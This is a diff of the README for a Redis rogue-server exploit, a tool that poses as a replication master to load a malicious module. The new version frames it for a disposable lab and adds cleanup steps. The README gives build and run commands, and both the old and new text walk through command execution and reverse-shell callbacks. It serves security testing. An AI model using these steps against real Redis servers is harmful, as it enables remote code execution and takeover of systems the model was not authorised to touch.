@@ -1,120 +1,67 @@
-# Redis Rogue Server
+# Redis Rogue Server Refined
 
-A exploit for Redis(<=5.0.5) RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).
+An Apache-2.0 derivative of [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) for an **owned, disposable Redis lab**. It stages a Redis module through a fake replication server, checks the real MODULE LOAD reply, and offers command execution or a reverse shell. The module source was refined from the upstream exp.c; the bundled redismodule.h is retained from upstream. The original repository's Git history is preserved.
 
-__Support interactive shell and reverse shell!__
+The upstream description says Redis <=5.0.5. This revision was motivated by one Redis 5.0.9 lab, but compatibility with other versions and deployments is not established. This technique requires the target to accept the relevant Redis configuration, replication, and module commands. Replication can replace the target's dataset: **use a disposable lab instance, not a production database**.
 
 ## Requirements
 
-Python 3.6+
+- Linux x86-64 build host with GCC and GNU Make (for a Linux x86-64 target)
+- Python 3.8+ on the same host; no third-party Python packages
+- A target Redis instance in your authorized lab that can connect back to the local IPv4 and listening port
+- A writable target directory, /tmp by default
 
-If you want to modify or recompile the redis module, you also require `make`.
+Build from the repository root. The generated module.so is ignored by Git and must be built for the target architecture:
 
-## Usage
-
-Compile exploit:
-
-``` bash
-cd RedisModulesSDK/exp/
+~~~sh
+make clean
 make
-```
+file module.so
+~~~
 
-Copy the .so file to same folder with `redis-rogue-server.py`.
+The file command should identify an ELF 64-bit shared object for x86-64. The script resolves module.so relative to its own location, so it also works from another current directory.
 
-```
-➜ ./redis-rogue-server.py -h
-______         _ _      ______                         _____                          
-| ___ \       | (_)     | ___ \                       /  ___|                         
-| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
-|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
-| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
-\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
-                                     __/ |                                            
-                                    |___/                                             
-@copyright n0b0dy @ r3kapig
+## Run against your lab
 
-Usage: redis-rogue-server.py [options]
+Use separate target and local addresses. Confirm that the target can reach the local listener port; the default is TCP 6379 because that was the reachable port in the motivating lab. If it is occupied or your lab uses a different allowed port, set --lport. The script starts the listener before changing replication settings.
 
-Options:
-  -h, --help           show this help message and exit
-  --rhost=REMOTE_HOST  target host
-  --rport=REMOTE_PORT  target redis port, default 6379
-  --lhost=LOCAL_HOST   rogue server ip
-  --lport=LOCAL_PORT   rogue server listen port, default 21000
-  --exp=EXP_FILE       Redis Module to load, default exp.so
-  -v, --verbose        Show full data stream
-```
+~~~sh
+TARGET_IPV4='YOUR_LAB_REDIS_IPV4'
+LOCAL_IPV4='YOUR_REACHABLE_LINUX_IPV4'
 
-## Example
+python3 redis-rogue-server.py \
+  --rhost "$TARGET_IPV4" --rport 6379 \
+  --lhost "$LOCAL_IPV4" --lport 6379 \
+  --dir /tmp --command id
+~~~
 
-### Interactive shell
+Expected successful output includes MODULE LOAD: OK and the output of id. The program exits with a nonzero status if it cannot build the session or load the module; a menu alone is never treated as proof of success.
 
-```
-➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
-______         _ _      ______                         _____                          
-| ___ \       | (_)     | ___ \                       /  ___|                         
-| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
-|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
-| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
-\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
-                                     __/ |                                            
-                                    |___/                                             
-@copyright n0b0dy @ r3kapig
+For an interactive command menu, omit --command:
 
-[info] TARGET 127.0.0.1:6379
-[info] SERVER 127.0.0.1:21000
-[info] Setting master...
-[info] Setting dbfilename...
-[info] Loading module...
-[info] Temerory cleaning up...
-What do u want, [i]nteractive shell or [r]everse shell: i
-[info] Interact mode start, enter "exit" to quit.
-[<<] whoami
-[>>] :n0b0dy
-[<<] 
-```
+~~~sh
+python3 redis-rogue-server.py --rhost "$TARGET_IPV4" --lhost "$LOCAL_IPV4"
+~~~
 
-### Reverse shell
+Choose i, enter a command such as id, then enter exit to return to the menu. Each command is a separate shell invocation; it is not a persistent terminal. Choose q to unload the module and quit.
 
-Invoke reverse shell:
+For a reverse shell, start a listener on another **target-reachable** port, then choose r in the menu and enter its numeric IPv4 address and port. The module's system.rev response confirms only that the request was accepted. Verify the callback and user identity in the listener itself. The module runs with the Redis service account's privileges.
 
-```
-➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
-______         _ _      ______                         _____
-| ___ \       | (_)     | ___ \                       /  ___|
-| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __
-|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
-| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |
-\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|
-                                     __/ |
-                                    |___/
-@copyright n0b0dy @ r3kapig
+## Checks and recovery
 
-[info] TARGET 127.0.0.1:6379
-[info] SERVER 127.0.0.1:21000
-[info] Setting master...
-[info] Setting dbfilename...
-[info] Loading module...
-[info] Temerory cleaning up...
-What do u want, [i]nteractive shell or [r]everse shell: r
-[info] Open reverse shell...
-Reverse server address: 127.0.0.1
-Reverse server port: 9999
-[info] Reverse shell payload sent.
-[info] Check at 127.0.0.1:9999
-[info] Unload module...
-```
+The script records the original Redis dir and dbfilename, uses a random target-side .so name, restores standalone replication, removes the staged file, and restores the original settings. It unloads the module on exit. Cleanup is best effort if the connection or process fails; inspect the target afterward:
 
-Receive reverse shell:
+~~~sh
+redis-cli -h "$TARGET_IPV4" -p 6379 ROLE
+redis-cli -h "$TARGET_IPV4" -p 6379 CONFIG GET dir
+redis-cli -h "$TARGET_IPV4" -p 6379 CONFIG GET dbfilename
+redis-cli -h "$TARGET_IPV4" -p 6379 MODULE LIST
+~~~
 
-```
-➜ nc -lvvp 9999
-Listening on [0.0.0.0] (family 0, port 9999)
-Connection from localhost.localdomain 39312 received!
-whoami
-n0b0dy
-```
+Compare those values with your own pre-run baseline. If MODULE LOAD fails, use -v to inspect the exact Redis reply, confirm the target directory is writable, verify architecture with file module.so, and check that the target can connect to the listener. The error may be generic even when the server log contains the specific filesystem or dlopen cause. Do not assume the module loaded just because replication transferred bytes.
 
-## Thanks
+The --exp option selects a different local module file. --passwd supports a password-protected lab, but a command-line password can be visible to local process listings; use only in a suitable test environment.
 
-* [RicterZ](https://github.com/RicterZ)'s redis exec module: <https://github.com/RicterZ/RedisModules-ExecuteCommand>
+## Provenance and license
+
+The original fake-replication concept, Python PoC, Redis module, and Redis module header come from [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server), which credits [RicterZ/RedisModules-ExecuteCommand](https://github.com/RicterZ/RedisModules-ExecuteCommand). The upstream license is preserved in [LICENSE](LICENSE). This revision removes prebuilt objects and unused SDK utility code, and builds the corrected module from source at the repository root. Modified files carry attribution notices.
